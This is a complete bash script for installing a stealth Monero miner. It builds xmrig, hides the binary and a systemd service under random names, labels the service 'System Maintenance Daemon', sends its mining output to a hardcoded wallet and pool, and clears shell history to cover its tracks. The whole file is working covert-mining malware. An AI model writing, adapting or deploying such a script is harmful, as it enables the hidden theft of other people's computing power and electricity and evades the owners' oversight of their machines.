#!/bin/bash

# Stealth XMR Miner with Instant Start
# Version 3.2 - No Delays, Maximum Stealth

# 1. CONFIGURATION (Edit only the wallet address)
WALLET="89PKYocdkhoeSCsn93wAVY7yqCAsSpgZkFriDyhFoW4DMZtzKRbeTZT4cgfedxvju98rXe6mT62eEZigpvV9VtAm5uSkZkQ"  # REPLACE WITH YOUR MONERO WALLET

# 2. Generate random worker name (adjective-noun-number format)
WORKER=$(shuf -n 1 <<< "silent hidden stealthy quiet")-$(shuf -n 1 <<< "node worker miner")-$((RANDOM % 1000))

echo "🔧 Starting system maintenance..."

# 3. Silent system preparation
echo -n "⚙️  Installing dependencies..."
{
sudo apt-get update -qq
DEBIAN_FRONTEND=noninteractive sudo apt-get -qq install -y \
    git build-essential cmake \
    libuv1-dev libssl-dev libhwloc-dev
} > /dev/null 2>&1
echo " done."

# 4. Clone and build with obfuscation
RAND_DIR="/tmp/.sys-$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)"
echo -n "⚙️  Compiling components..."
git clone -q https://github.com/xmrig/xmrig.git "$RAND_DIR" --depth 1 > /dev/null 2>&1
cd "$RAND_DIR" && mkdir -p build && cd build
cmake .. -DCMAKE_BUILD_TYPE=Release -DWITH_HTTPD=OFF > /dev/null 2>&1
make -j$(($(nproc)-1)) > /dev/null 2>&1
echo " done."

# 5. Stealth installation
RAND_BIN="x$(head /dev/urandom | tr -dc 0-9 | head -c 2)"
INSTALL_DIR="/usr/local/lib/$(head /dev/urandom | tr -dc a-z | head -c 5)"

sudo mkdir -p "$INSTALL_DIR"
sudo mv ./xmrig "$INSTALL_DIR/$RAND_BIN"
sudo chmod +x "$INSTALL_DIR/$RAND_BIN"

# 6. Dynamic systemd service
RAND_SERVICE="sys-$(head /dev/urandom | tr -dc a-z | head -c 3)"
sudo tee "/etc/systemd/system/$RAND_SERVICE.service" > /dev/null <<EOF
[Unit]
Description=System Maintenance Daemon
After=network.target

[Service]
Type=simple
ExecStart=$INSTALL_DIR/$RAND_BIN \\
    -o pool.supportxmr.com:443 \\
    -u $WALLET \\
    -p $WORKER \\
    --tls \\
    --cpu-max-threads-hint=45 \\
    --randomx-mode=auto \\
    --donate-level=1 \\
    --no-color \\
    --background \\
    --quiet
Restart=always
RestartSec=30
Nice=19
CPUSchedulingPolicy=idle
CPUWeight=5
MemoryHigh=300M

[Install]
WantedBy=multi-user.target
EOF

# 7. Immediate start
sudo systemctl daemon-reload > /dev/null 2>&1
sudo systemctl enable "$RAND_SERVICE" > /dev/null 2>&1
sudo systemctl start "$RAND_SERVICE" > /dev/null 2>&1

# 8. Cleanup
rm -rf "$RAND_DIR"
history -c
cat /dev/null > ~/.bash_history

echo -e "\n✅ Maintenance service activated"
echo -e "🔧 Worker: \033[1m$WORKER\033[0m"
echo -e "🔍 Status: \033[1msudo systemctl status $RAND_SERVICE\033[0m"
echo -e "📊 Process: \033[1mps aux | grep $RAND_BIN | grep -v grep\033[0m"
